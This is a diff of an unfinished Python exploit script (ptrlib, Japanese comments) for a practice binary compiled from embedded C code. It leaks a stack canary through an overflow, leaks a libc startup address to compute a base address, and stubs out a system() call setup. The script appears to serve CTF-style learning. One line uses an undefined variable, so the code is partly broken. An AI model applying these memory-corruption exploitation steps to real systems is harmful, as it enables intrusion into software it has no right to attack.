@@ -2,9 +2,7 @@ from ptrlib import *
 
 # canaryのリーク
 def canary_leak(elf, proc):
-    print("canary_leak")
-    payload = b'P' * 0x10
-    payload += b'P' * 8
+    payload = b'P' * 0x18
     payload += b'P' # カナリー一歩手前
     proc.sendafter("Input (1/4) >> ", payload)
     proc.recv(len("Output : ") + len(payload)) # ゴミ
@@ -13,9 +11,21 @@ def canary_leak(elf, proc):
     return (leaked_canary * 0x100)
 
 
-def main():
-    """
-```
+def libc_base_addr_leak(elf, proc):
+    payload = b''
+    payload += b'Q' * 8 * 5
+    proc.sendafter("Input (2/4) >> ", payload)
+    proc.recv(len("Output : ") + len(payload))
+    leaked = proc.recv(6)
+    leaked_libc_start_main = int.from_bytes(leaked, byteorder='little')
+    return (leaked_libc_start_main)
+
+def set_args_for_system_function(elf, proc):
+    pass
+
+
+"""
+```bash
 << EOF cat | gcc -static-pie -z lazy -o hard -x c -
 #include <stdio.h>
 #include <unistd.h>
@@ -37,29 +47,22 @@ int main(void) {
 }
 // gcc hard.c -static-pie -o hard
 EOF
-```
-    """
+"""
+def main():
     elf = ELF("./hard")
     proc = Process("./hard")
 
     input()
-    print("leaked_canary", hex(canary_leak(elf, proc)))
 
-    addr_setbuf_got = elf.symbol("setbuf") # got addrを調べる
-
-    payload = b'Q' * 0x10
-    payload += b'Q' * 8
-    payload = p64(next(elf.gadget("pop rsi;")))
-    payload += p64(addr_setbuf_got)
-
-    print("addr_setbuf_got", hex(addr_setbuf_got))
-    proc.sendafter("Input (2/4) >> ", payload)
-
-    proc.recv(len("Output : "))
-    leaked = proc.recv(4)
-    print("leaked", leaked)
+    leaked_canary = canary_leak(elf, proc)
+    print("leaked_canary", hex(leaked_canary))
+    leaked_libc_call_main = libc_base_addr_leak(elf, proc) - 0x68
+    offset_libc_call_main = elf.symbol("__libc_start_call_main") # 今回は`-static-pie`でコンパイルされている
+    print("leaked_libc_base_addr", hex(leaked_libc_call_main))
+    libc_elf.base = leaked_libc_call_main - offset_libc_call_main 
 
     proc.interactive()
+    
 
 if __name__ == "__main__":
     main()
